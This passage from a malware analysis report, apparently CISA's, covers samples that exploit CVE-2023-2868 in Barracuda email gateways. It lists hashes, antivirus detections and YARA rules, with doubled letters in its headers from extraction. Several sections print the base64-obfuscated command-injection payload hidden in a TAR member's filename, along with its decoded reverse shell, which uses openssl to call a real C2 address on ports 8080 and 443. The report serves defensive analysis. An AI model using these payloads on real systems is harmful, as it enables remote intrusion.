9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\n\nSSHHAA551122 feab76baea3e0701dd025b140cde25c1b7516ca9bca49ee8e3728b5d787e8a25ef456b094594f9fc30b89c64b776ab\n5120617ee4f2012d74f6327dff09f0c14f\nssssddeeeepp 96:q1Djqi+Yziclds42dB+1jhXIM1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UP:oj+VYdsfBkjhRLH4q6fbK\n\nEEnnttrrooppyy 1.660671\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\n-----\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n9d0c7a45dd... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.”\n\n33ff22ccaa1199aadd33663355ff337799996688bb00330022cc77ee4422ccff995544ff8855aabb6611116666cc66ff7700aaccffeebbcc7722ff3388aabb77\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666612441-0a151727b565980001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 84603aa2f1d30f6b137a6b9300f2adcc\n\n\n-----\n\nSSHHAA11 ab9942e172733ec3265dd93e0033e2ace77905c1\n\nSSHHAA225566 3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\n\nSSHHAA551122 96499176dc81f64f3ab0daf7319bd1dc54301ccaada75d37a8377584f6044774e103361f207f6f204e62f251ae41e63\n9f923c25cf2feee5b2557d10908bb54c5\nssssddeeeepp 96:vm1soERqi+YhiclRs42dB+1jhXtH1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6U+:+Eh+7YRsfBkjh7LH4q6fbL\n\nEEnnttrrooppyy 1.660213\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n3f2ca19ad3... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.”\n\n\n-----\n\n8800334422110088ee99ff00ff11ffdd66bb55cc4444ee8888000066cceebbee3377ee44eeccccbb33aa00ff556677663366bb2222aadd221100cc00aa004433\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666612600-0a151727b265b10001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 74b2cb4099ffb3a6eb2ada984f08a55c\n\nSSHHAA11 3a3d73662809b957c94407e7938c90a41e9b6023\n\nSSHHAA225566 80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\n\nSSHHAA551122 4b4e7f5ef6fa006a3758649f2e664ca93198c3f82956c96975cafd815148b34eae7e7b6a3a2b9b632fe2f807713c536\nb77c7054ddd71a2851ed92ec7b4d26af0\nssssddeeeepp 96:81TMqi+YItziclXNI2dB+1jhXoueM1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UTS:Co+VmYXNvBkjh4tOLH4q6fbWS\n\nEEnnttrrooppyy 1.661984\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n\n\n-----\n\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n80342108e9... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.”\n\nff553366aa77bb7755bb77220055776622bb7755aa003377eebbff66550033002299aaaabb11aa0022aaffaabb1144bb22770099779977cc3322ee77ee00ffaa\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666614870-0a151727b166b50001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 e7f1555f9f9e9bca1898c720b2ef0866\n\nSSHHAA11 59ac617c7f6d779d0853921afbaf36574846ab9f\n\nSSHHAA225566 f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\n\nSSHHAA551122 d5b930f4a13243ffd5ab43a50de5ba01154ee5054c4cea6830f583d761cd22828efd62e8cf35d5892649587b8982d3\nc8e7f4440a34ccc9b40761355a69372a06\nssssddeeeepp 96:7Rz1sZZqi+YIxiclk7342dB+1jhUQomK1rHNqudK3b7OKiTcGuRNdecg6dxkXBdu:7R+J+VcY43fBkjhxjkLH4q6fbOo\n\nEEnnttrrooppyy 1.661252\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\n\n-----\n\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\nf536a7b75b... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.”\n\n994499dd44bb0011ff3311225566ee55ee99cc22bb0044ee555577ddccccaa00aa2255ffcc22ff66aaaa33661188993366bbeeffcc77552255ee11ddff778888\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee snapshot.tar\n\nSSiizzee 20480 bytes\n\nTTyyppee POSIX tar archive (GNU)\n\nMMDD55 42722b7d04f58dcb8bd80fe41c7ea09e\n\nSSHHAA11 1903a3553bcb291579206b39e7818c77e2c07054\n\nSSHHAA225566 949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\n\nSSHHAA551122 86f28510b50f1f0640065b2f5f6049d879c99c659b80dc4604942e2df8f7ff143f70acce05491f95e8eeff0718c69011c\n1c92d2611f3b86a5419c6dea1b802e0\nssssddeeeepp 48:G8n4+ntb7Ytb7bIbfj1ZbfjZGCGBCGpiK4rD1EK4rD1:GaXiXbELnLHGQGdqZq\n\nEEnnttrrooppyy 0.978982\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10452108\"\nDate = \"2023-06-20\"\nLast_Modified = \"\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"communicates-with-c2 installs-other-components\"\nMalware_Type = \"backdoor\"\nTool_Type = \"unknown\"\nDescription = \"Detects malicious Linux reverse shell samples\"\n\n\n-----\n\nSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s0 = { 6f 47 68 37 6f 68 63 34 }\n$s1 = { 41 6b 65 6f 38 61 68 58 }\n$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of them\n}\n\n- rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\nSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\nSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\nSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s1 = { 61 62 63 64 65 66 67 }\n$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n$s4 = { 49 43 39 30 62 58 41 76 }\n$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n$n1 = { 6f 47 68 37 6f 68 63 34 }\n$n2 = { 41 6b 65 6f 38 61 68 58 }\n$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of ($s*) or all of ($n*)\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n2a5de691243f2b91f164c3021c157fbd783b4f\n949d4b01f3... Dropped\n3e7d5f5950182e52ec868cd40b\n\n949d4b01f3... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact is a .tar sample that contains five files compressed. Four of the files within this .tar sample do not contain malicious\ncapabilities. One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the\narchive the payload is seen below.\n\n--Begin Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64\n-d|${G}h;wh66489.txt`'\n--End Payload-\n\n-----\n\nff228899bb556655883399779944ffee44ff445500eedd00cc99334433bb88ffbb669999ff9977554444dd99aaff22aa6600885511aabbcc88bb44665566ee00\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee snapshot0.tar\n\nSSiizzee 20480 bytes\n\nTTyyppee POSIX tar archive (GNU)\n\nMMDD55 ac4fb6d0bfc871be6f68bfa647fc0125\n\nSSHHAA11 dc5841d8ed9ab8a5f3496f2258eafb1e0cedf4d3\n\nSSHHAA225566 f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\n\nSSHHAA551122 0ebf9a75b7bcae7b7e28bef4d8e81e53829678104b09220e684e54df211130fafaa3387f057cbe8fdf24a0138e1ac9f5\nf24d83f467c4e0469c7dff009e8381d5\nssssddeeeepp 48:G8nZm+ntb7Ytb7bIbfj1ZbfjZGCGBCGpiK4rD1EK4rD1:GmfXiXbELnLHGQGdqZq\n\nEEnnttrrooppyy 0.978201\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10452108\"\nDate = \"2023-06-20\"\nLast_Modified = \"\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"communicates-with-c2 installs-other-components\"\nMalware_Type = \"backdoor\"\nTool_Type = \"unknown\"\nDescription = \"Detects malicious Linux reverse shell samples\"\nSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s0 = { 6f 47 68 37 6f 68 63 34 }\n$s1 = { 41 6b 65 6f 38 61 68 58 }\n$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of them\n}\n\n- rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\n\n\n-----\n\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\nSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\nSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\nSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s1 = { 61 62 63 64 65 66 67 }\n$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n$s4 = { 49 43 39 30 62 58 41 76 }\n$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n$n1 = { 6f 47 68 37 6f 68 63 34 }\n$n2 = { 41 6b 65 6f 38 61 68 58 }\n$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of ($s*) or all of ($n*)\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n2a5de691243f2b91f164c3021c157fbd783b4f\nf289b56583... Dropped\n3e7d5f5950182e52ec868cd40b\n\nf289b56583... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact is a .tar sample that contains five files compressed. Four of the files within this .tar sample do not contain malicious\ncapabilities. One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the\narchive the payload is seen below.\n\n--Begin Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o\n$abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\n--End Payload-\n22aa55ddee669911224433ff22bb9911ff116644cc33002211cc115577ffbbdd778833bb44ff33ee77dd55ff55995500118822ee5522eecc886688ccdd4400bb\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdW\nlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCAL3RtcC9wIDIL2Rldi9udWxsO3JtIC90bXAvcCIeebaGs22ech22o_\nabcdefgeese64_-dGhwh66489.txt\nNNaammee abcdefg_c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xd\nWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCAL3RtcC9wIDIL2Rldi9udWxsO3JtIC90bXAvcCI_ee_ba_G_s_ech\n_o_abcdefg_ee_se64_d_G_h_wh66489.txt\nSSiizzee 29 bytes\n\nTTyyppee ASCII text, with no line terminators\n\nMMDD55 fe1e2d676c91f899b706682b70176983\n\nSSHHAA11 77b1864c489affe0ac2284135050373951b7987e\n\nSSHHAA225566 2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\n\nSSHHAA551122 1c22a05e50aa3d954c2d5a1629e192a915c9d576cd1d7cd9ac3a3bbb35d934f6fc1768d996653a0bca2950185c2a9\ncec3d1675ca29a19b69da26100990eaa0d8\nssssddeeeepp 3:TTGRH+YHMFck:TKYYHIck\n\n\n-----\n\nEEnnttrrooppyy 4.047299\n\n\nAAnnttiivviirruuss\n\n\nAAhhnnLLaabb Exploit/Bin.CVE-2023-2868\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10452108\"\nDate = \"2023-06-20\"\nLast_Modified = \"\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"communicates-with-c2 installs-other-components\"\nMalware_Type = \"backdoor\"\nTool_Type = \"unknown\"\nDescription = \"Detects malicious Linux reverse shell samples\"\nSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s0 = { 6f 47 68 37 6f 68 63 34 }\n$s1 = { 41 6b 65 6f 38 61 68 58 }\n$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of them\n}\n\n- rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\nSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\nSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\nSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\nstrings:\n$s1 = { 61 62 63 64 65 66 67 }\n$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n$s4 = { 49 43 39 30 62 58 41 76 }\n$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n$n1 = { 6f 47 68 37 6f 68 63 34 }\n$n2 = { 41 6b 65 6f 38 61 68 58 }\n$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\ncondition:\nall of ($s*) or all of ($n*)\n}\n\n\n-----\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n949d4b01f31256e5e9c2b04e557dcca0a25fc\n2a5de69124... Dropped_By\n2f6aa3618936befc7525e1df788\n\nf289b565839794fe4f450ed0c9343b8fb699f9\n2a5de69124... Dropped_By\n7544d9af2a60851abc8b4656e0\n\n2a5de69124... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact is dropped by two different .tar files and contains a payload inside its filename that exploits CVE-2023-2868. The exploit\npayload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and\nexecutes the reverse shell code. The reverse shells establish connections using the \"OpenSSL\" to the C2 IP address\n\"107[.]148[.]223[.]196\" and ports “8080” or \"443.\" The standard input and output are redirected to the named pipe \"/tmp/p\" and then\nremoves \"tmp/p\" after the connection is closed.\n\nThe contents within the two dropped files are the same and is a string \"oGh7ohc4Akeo8ahXeequei7A09302.\" This accounts for the two\nsamples having the same hash, however, payload contents are different within the names of these files. When the payload executes, the\ncommands slightly differ in the use of the port number as seen below.\n\nWhen the \"snapshot.tar\" file is decompressed the below payload is revealed.\n--Begin Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64\n-d|${G}h;wh66489.txt`'\n--End Payload-\n--Begin Decoded Payload-setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:8080 >/tmp/p 2>/dev/null;rm\n/tmp/p\"\n--End Decoded Payload-\nWhen the \"snapshot0.tar\" file is decompressed the below payload is revealed.\n--Begin 